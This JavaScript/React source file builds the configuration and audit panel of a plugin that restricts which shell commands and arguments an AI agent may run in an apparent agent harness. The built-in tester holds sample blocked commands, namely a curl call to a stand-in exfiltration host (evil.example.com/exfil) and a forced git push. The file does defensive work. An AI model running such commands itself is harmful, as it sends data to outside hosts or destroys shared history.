/**
 * agent-tool-limitation (Built-in Client UI)
 *
 * 插件自带的可视化配置与审计 UI（无需安装任何其他插件，单独安装本插件即可在 DeepSeek Harness 桌面版/网页版顶部栏打开）
 */
window.__ModuleLoader__.load({
  id: "agent-tool-limitation",
  factory: (require) => {
    var module = { exports: {} };
    var exports = module.exports;
    Object.defineProperty(exports, Symbol.toStringTag, { value: "Module" });

    const React = require("react");
    const ReactDOM = require("react-dom");
    const { useState, useEffect, useCallback } = React;
    const h = React.createElement;

    const STYLE_TEXT = `
      .acl-ui-btn {
        display: inline-flex;
        align-items: center;
        gap: 6px;
        padding: 5px 11px;
        border-radius: 7px;
        font-size: 12px;
        font-weight: 600;
        cursor: pointer;
        border: 1px solid rgba(16, 185, 129, 0.45);
        background: linear-gradient(135deg, rgba(6, 78, 59, 0.85), rgba(15, 23, 42, 0.92));
        color: #6ee7b7;
        transition: all 0.15s ease;
      }
      .acl-ui-btn:hover {
        border-color: #34d399;
        color: #ffffff;
      }
      .acl-ui-fab {
        position: fixed;
        right: 20px;
        bottom: 64px;
        z-index: 9997;
        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.45);
      }
      .acl-ui-backdrop {
        position: fixed;
        inset: 0;
        z-index: 10001;
        background: rgba(2, 6, 23, 0.76);
        backdrop-filter: blur(4px);
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 20px;
      }
      .acl-ui-modal {
        width: min(1120px, 95vw);
        height: min(820px, 90vh);
        background: #0f172a;
        color: #f1f5f9;
        border: 1px solid #334155;
        border-radius: 12px;
        display: flex;
        flex-direction: column;
        overflow: hidden;
        box-shadow: 0 24px 60px rgba(0, 0, 0, 0.65);
        font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
      }
      .acl-ui-header {
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 13px 18px;
        background: #1e293b;
        border-bottom: 1px solid #334155;
      }
      .acl-ui-body {
        flex: 1;
        overflow-y: auto;
        padding: 16px 18px;
      }
      .acl-ui-card {
        background: #1e293b;
        border: 1px solid #334155;
        border-radius: 8px;
        padding: 14px;
        margin-bottom: 14px;
      }
      .acl-ui-table {
        width: 100%;
        border-collapse: collapse;
        font-size: 12px;
      }
      .acl-ui-table th, .acl-ui-table td {
        padding: 8px 10px;
        border-bottom: 1px solid #334155;
        text-align: left;
        vertical-align: middle;
      }
      .acl-ui-table th {
        color: #94a3b8;
        font-weight: 600;
        background: rgba(15, 23, 42, 0.55);
      }
      .acl-ui-input {
        background: #0f172a;
        border: 1px solid #475569;
        color: #f8fafc;
        border-radius: 6px;
        padding: 5px 9px;
        font-size: 12px;
      }
      .acl-ui-smallbtn {
        padding: 4px 10px;
        border-radius: 6px;
        font-size: 11px;
        font-weight: 600;
        cursor: pointer;
        border: 1px solid #475569;
        background: #1e293b;
        color: #e2e8f0;
      }
      .acl-ui-smallbtn-green {
        background: rgba(16, 185, 129, 0.2);
        border-color: rgba(16, 185, 129, 0.5);
        color: #6ee7b7;
      }
      .acl-ui-smallbtn-amber {
        background: rgba(245, 158, 11, 0.2);
        border-color: rgba(245, 158, 11, 0.5);
        color: #fcd34d;
      }
      .acl-ui-smallbtn-red {
        background: rgba(239, 68, 68, 0.2);
        border-color: rgba(239, 68, 68, 0.5);
        color: #fca5a5;
      }
    `;

    async function aclGetState() {
      const res = await fetch("/agent-tool-limitation-api/state", { cache: "no-store" });
      return res.json();
    }

    async function aclPostAction(action, payload = {}) {
      const res = await fetch("/agent-tool-limitation-api/action", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ action, ...payload }),
      });
      return res.json();
    }

    function AccessControlModal({ onClose }) {
      const [policy, setPolicy] = useState(null);
      const [auditLog, setAuditLog] = useState([]);
      const [newCmd, setNewCmd] = useState("");
      const [testCmd, setTestCmd] = useState("curl -i http://127.0.0.1:18080/api/orders/2001");
      const [toast, setToast] = useState("");

      const notify = (msg) => {
        setToast(msg);
        setTimeout(() => setToast(""), 4000);
      };

      const refresh = useCallback(async () => {
        try {
          const json = await aclGetState();
          if (json && json.ok) {
            setPolicy(json.accessPolicy || {});
            setAuditLog(json.accessAuditLog || []);
          }
        } catch {}
      }, []);

      useEffect(() => {
        refresh();
        const timer = setInterval(refresh, 2500);
        return () => clearInterval(timer);
      }, [refresh]);

      useEffect(() => {
        const onKey = (e) => {
          if (e.key === "Escape") onClose();
        };
        window.addEventListener("keydown", onKey);
        return () => window.removeEventListener("keydown", onKey);
      }, [onClose]);

      const updatePolicy = async (patch) => {
        const res = await aclPostAction("update_policy", { policy: patch });
        if (res.ok) {
          setPolicy(res.accessPolicy);
        }
      };

      const updateCmdRule = async (cmd, rulePatch) => {
        const cur = (policy?.commandRules && policy.commandRules[cmd]) || {
          allowed: true,
          argWhitelistEnabled: false,
          allowedArgs: [],
        };
        const nextRule = { ...cur, ...rulePatch };
        await updatePolicy({ commandRules: { [cmd]: nextRule } });
        notify(
          `已更新 [${cmd}]: ${nextRule.allowed ? "允许执行" : "禁止执行"} | 参数白名单: ${
            nextRule.argWhitelistEnabled ? "已开启" : "未开启 (不检查参数)"
          }`
        );
      };

      const handleAddCmd = async () => {
        const c = newCmd.trim();
        if (!c) return;
        await updateCmdRule(c, { allowed: true, argWhitelistEnabled: false, allowedArgs: [] });
        setNewCmd("");
      };

      const handleTest = async (cmdStr) => {
        const res = await aclPostAction("test_command", { command: cmdStr });
        if (res.ok) {
          const v = res.verdict;
          notify(`${v.allowed ? "✅ 放行" : "🚫 拦截"} [${v.rule}]: ${v.reason}`);
          refresh();
        }
      };

      const rules = policy?.commandRules || {};

      return h(
        "div",
        { className: "acl-ui-backdrop", onClick: (e) => e.target === e.currentTarget && onClose() },
        h("style", null, STYLE_TEXT),
        h(
          "div",
          { className: "acl-ui-modal" },
          // Header
          h(
            "div",
            { className: "acl-ui-header" },
            h(
              "div",
              { style: { display: "flex", alignItems: "center", gap: "10px", fontWeight: 700, fontSize: "15px" } },
              h("span", null, "🛡️ Agent 工具与参数限制插件 (agent-tool-limitation)"),
              h(
                "span",
                {
                  className: `acl-ui-smallbtn ${policy?.enabled ? "acl-ui-smallbtn-green" : "acl-ui-smallbtn-red"}`,
                },
                policy?.enabled ? "运行中 (ctx.tools.guard)" : "已暂停"
              )
            ),
            h(
              "div",
              { style: { display: "flex", gap: "8px" } },
              h(
                "button",
                {
                  className: `acl-ui-smallbtn ${policy?.enabled ? "acl-ui-smallbtn-green" : "acl-ui-smallbtn-red"}`,
                  onClick: () => updatePolicy({ enabled: !policy?.enabled }),
                },
                policy?.enabled ? "✓ 总开关：开启" : "✗ 总开关：关闭"
              ),
              h(
                "button",
                {
                  className: `acl-ui-smallbtn ${policy?.blockShellChaining ? "acl-ui-smallbtn-green" : ""}`,
                  onClick: () => updatePolicy({ blockShellChaining: !policy?.blockShellChaining }),
                },
                policy?.blockShellChaining ? "✓ 阻断命令拼接 (; | & $() >)" : "允许命令拼接"
              ),
              h(
                "button",
                { className: "acl-ui-smallbtn acl-ui-smallbtn-red", onClick: onClose },
                "× 关闭 (Esc)"
              )
            )
          ),

          // Body
          h(
            "div",
            { className: "acl-ui-body" },
            toast
              ? h(
                  "div",
                  {
                    style: {
                      padding: "8px 12px",
                      marginBottom: "12px",
                      borderRadius: "6px",
                      background: "rgba(16, 185, 129, 0.15)",
                      border: "1px solid rgba(16, 185, 129, 0.4)",
                      color: "#6ee7b7",
                      fontSize: "12px",
                    },
                  },
                  toast
                )
              : null,

            // Section 1: Per-tool Rules Table
            h(
              "div",
              { className: "acl-ui-card" },
              h(
                "div",
                { style: { display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "10px" } },
                h(
                  "div",
                  null,
                  h("div", { style: { fontWeight: 700, fontSize: "13px", color: "#38bdf8" } }, "1. 按工具/命令独立配置（命令开关 + 参数/对象地址白名单开关）"),
                  h(
                    "div",
                    { style: { fontSize: "11px", color: "#94a3b8", marginTop: "2px" } },
                    "说明：先选择某个工具是否允许执行；再选择是否对该工具开启『参数白名单』。如果不开启参数白名单，则不对该工具后面的参数或对象地址做检查。"
                  )
                ),
                h(
                  "div",
                  { style: { display: "flex", gap: "6px" } },
                  h("input", {
                    className: "acl-ui-input",
                    placeholder: "新增工具/命令 (如 ssh, nmap, python)...",
                    value: newCmd,
                    onChange: (e) => setNewCmd(e.target.value),
                    onKeyDown: (e) => e.key === "Enter" && handleAddCmd(),
                    style: { width: "210px" },
                  }),
                  h("button", { className: "acl-ui-smallbtn acl-ui-smallbtn-green", onClick: handleAddCmd }, "+ 添加工具")
                )
              ),
              h(
                "table",
                { className: "acl-ui-table" },
                h(
                  "thead",
                  null,
                  h(
                    "tr",
                    null,
                    h("th", { style: { width: "110px" } }, "工具 / 命令"),
                    h("th", { style: { width: "125px" } }, "① 命令是否允许"),
                    h("th", { style: { width: "175px" } }, "② 参数白名单开关"),
                    h("th", null, "③ 允许的参数 / 目标对象地址白名单（逗号分隔，仅开启时检查）")
                  )
                ),
                h(
                  "tbody",
                  null,
                  Object.entries(rules).map(([cmd, rule]) =>
                    h(
                      "tr",
                      { key: cmd, style: { opacity: rule.allowed ? 1 : 0.5 } },
                      h("td", { style: { fontFamily: "monospace", fontWeight: 700, color: "#38bdf8" } }, cmd),
                      h(
                        "td",
                        null,
                        h(
                          "button",
                          {
                            className: `acl-ui-smallbtn ${rule.allowed ? "acl-ui-smallbtn-green" : "acl-ui-smallbtn-red"}`,
                            onClick: () => updateCmdRule(cmd, { allowed: !rule.allowed }),
                          },
                          rule.allowed ? "✓ 允许执行" : "✗ 禁止执行"
                        )
                      ),
                      h(
                        "td",
                        null,
                        h(
                          "button",
                          {
                            className: `acl-ui-smallbtn ${rule.argWhitelistEnabled ? "acl-ui-smallbtn-amber" : ""}`,
                            onClick: () => updateCmdRule(cmd, { argWhitelistEnabled: !rule.argWhitelistEnabled }),
                          },
                          rule.argWhitelistEnabled ? "🔒 已开启参数白名单" : "🔓 未开启 (不检查参数)"
                        )
                      ),
                      h(
                        "td",
                        null,
                        rule.argWhitelistEnabled
                          ? h("input", {
                              className: "acl-ui-input",
                              style: { width: "100%", fontFamily: "monospace" },
                              defaultValue: (rule.allowedArgs || []).join(", "),
                              placeholder: "输入允许的目标地址、目录前缀或子命令（如 http://127.0.0.1, http://localhost）",
                              onBlur: (e) => {
                                const nextArgs = e.target.value
                                  .split(",")
                                  .map((s) => s.trim())
                                  .filter(Boolean);
                                if (nextArgs.join(",") !== (rule.allowedArgs || []).join(",")) {
                                  updateCmdRule(cmd, { allowedArgs: nextArgs });
                                }
                              },
                              onKeyDown: (e) => {
                                if (e.key === "Enter") e.target.blur();
                              },
                            })
                          : h(
                              "span",
                              { style: { color: "#64748b", fontSize: "11px" } },
                              "未开启参数白名单 — 只要命令允许，不限制后面的参数或目标地址"
                            )
                      )
                    )
                  )
                )
              )
            ),

            // Section 2: Interactive Tester
            h(
              "div",
              { className: "acl-ui-card" },
              h("div", { style: { fontWeight: 700, fontSize: "13px", color: "#38bdf8", marginBottom: "8px" } }, "2. 实时放行与拦截演练测试器"),
              h(
                "div",
                { style: { display: "flex", gap: "8px", flexWrap: "wrap", marginBottom: "8px" } },
                h(
                  "button",
                  {
                    className: "acl-ui-smallbtn acl-ui-smallbtn-green",
                    onClick: () => handleTest("curl -i http://127.0.0.1:18080/api/orders/2001"),
                  },
                  "✅ 测试 curl 允许的目标地址 (127.0.0.1)"
                ),
                h(
                  "button",
                  {
                    className: "acl-ui-smallbtn acl-ui-smallbtn-red",
                    onClick: () => handleTest("curl -i https://evil.example.com/exfil"),
                  },
                  "🚫 测试 curl 未授权的目标地址 (evil.example.com)"
                ),
                h(
                  "button",
                  {
                    className: "acl-ui-smallbtn acl-ui-smallbtn-green",
                    onClick: () => handleTest("git status"),
                  },
                  "✅ 测试 git 允许的子命令 (status)"
                ),
                h(
                  "button",
                  {
                    className: "acl-ui-smallbtn acl-ui-smallbtn-red",
                    onClick: () => handleTest("git push --force origin main"),
                  },
                  "🚫 测试 git 未授权的子命令 (push --force)"
                ),
                h(
                  "button",
                  {
                    className: "acl-ui-smallbtn acl-ui-smallbtn-green",
                    onClick: () => handleTest("ls -la /tmp /var"),
                  },
                  "✅ 测试 ls (未开启参数检查，任意参数放行)"
                )
              ),
              h(
                "div",
                { style: { display: "flex", gap: "8px" } },
                h("input", {
                  className: "acl-ui-input",
                  style: { flex: 1, fontFamily: "monospace" },
                  value: testCmd,
                  onChange: (e) => setTestCmd(e.target.value),
                  onKeyDown: (e) => e.key === "Enter" && handleTest(testCmd),
                  placeholder: "输入任意命令与参数测试拦截效果...",
                }),
                h(
                  "button",
                  { className: "acl-ui-smallbtn acl-ui-smallbtn-green", onClick: () => handleTest(testCmd) },
                  "⚡ 立即校验"
                )
              )
            ),

            // Section 3: Audit Log
            h(
              "div",
              { className: "acl-ui-card" },
              h(
                "div",
                { style: { display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "8px" } },
                h("div", { style: { fontWeight: 700, fontSize: "13px", color: "#38bdf8" } }, `3. 访问控制实时审计日志 (${auditLog.length})`),
                h(
                  "button",
                  {
                    className: "acl-ui-smallbtn",
                    onClick: async () => {
                      await aclPostAction("clear_audit");
                      refresh();
                    },
                  },
                  "清空日志"
                )
              ),
              auditLog.length === 0
                ? h("div", { style: { color: "#64748b", fontSize: "12px", padding: "10px 0" } }, "暂无记录，点击上方按钮或让智能体执行命令即可看到实时审计结果。")
                : h(
                    "table",
                    { className: "acl-ui-table" },
                    h(
                      "thead",
                      null,
                      h(
                        "tr",
                        null,
                        h("th", null, "编号"),
                        h("th", null, "时间"),
                        h("th", null, "工具"),
                        h("th", null, "命令与参数"),
                        h("th", null, "结果"),
                        h("th", null, "触发规则"),
                        h("th", null, "详细原因")
                      )
                    ),
                    h(
                      "tbody",
                      null,
                      auditLog.map((r) =>
                        h(
                          "tr",
                          { key: r.id },
                          h("td", { style: { fontWeight: 700 } }, r.id),
                          h("td", { style: { color: "#64748b" } }, (r.time || "").slice(11, 19)),
                          h("td", null, r.tool || "bash"),
                          h("td", { style: { fontFamily: "monospace", color: "#e2e8f0" } }, r.command),
                          h(
                            "td",
                            null,
                            h(
                              "span",
                              {
                                className: `acl-ui-smallbtn ${r.decision === "ALLOW" ? "acl-ui-smallbtn-green" : "acl-ui-smallbtn-red"}`,
                              },
                              r.decision
                            )
                          ),
                          h("td", { style: { fontFamily: "monospace", fontSize: "11px" } }, r.rule),
                          h("td", { style: { color: r.decision === "ALLOW" ? "#cbd5e1" : "#fca5a5" } }, r.reason)
                        )
                      )
                    )
                  )
            )
          )
        )
      );
    }

    function HeaderTriggerButton() {
      return h(
        "button",
        {
          type: "button",
          className: "acl-ui-btn",
          onClick: () => window.dispatchEvent(new CustomEvent("agent-tool-limitation:open")),
          title: "打开 Agent 工具与参数限制配置面板",
        },
        "🛡️ 工具限制策略"
      );
    }

    function mountFloatingLauncher() {
      if (typeof document === "undefined") return;
      const containerId = "agent-tool-limitation-floating-root";
      if (document.getElementById(containerId)) return;
      const div = document.createElement("div");
      div.id = containerId;
      document.body.appendChild(div);

      function FloatingLauncher() {
        const [open, setOpen] = useState(false);
        useEffect(() => {
          const handler = () => setOpen(true);
          window.addEventListener("agent-tool-limitation:open", handler);
          return () => window.removeEventListener("agent-tool-limitation:open", handler);
        }, []);

        return h(
          React.Fragment,
          null,
          h("style", null, STYLE_TEXT),
          h(
            "button",
            {
              type: "button",
              className: "acl-ui-btn acl-ui-fab",
              onClick: () => setOpen(true),
            },
            "🛡️ 工具限制策略"
          ),
          open ? h(AccessControlModal, { onClose: () => setOpen(false) }) : null
        );
      }

      if (ReactDOM.createRoot) {
        ReactDOM.createRoot(div).render(h(FloatingLauncher));
      } else if (ReactDOM.render) {
        ReactDOM.render(h(FloatingLauncher), div);
      }
    }

    const inject = ["slots"];

    function apply(ctx) {
      mountFloatingLauncher();

      // 1. 注入到 DeepSeek Harness 会话顶部操作栏
      ctx.slots.inject("conversation.session.header.actions", () =>
        ctx.slots.register(
          {
            name: "conversation.session.header.actions",
            id: "agent-tool-limitation-header-btn",
            order: 8,
          },
          HeaderTriggerButton
        )
      );

      // 2. 注入到输入框上方区域（欢迎页与会话页均可见）
      ctx.slots.inject("conversation.composer.dock", () =>
        ctx.slots.register(
          {
            name: "conversation.composer.dock",
            id: "agent-tool-limitation-dock-btn",
            order: 8,
          },
          HeaderTriggerButton
        )
      );
    }

    exports.apply = apply;
    exports.inject = inject;
    return module.exports;
  },
});
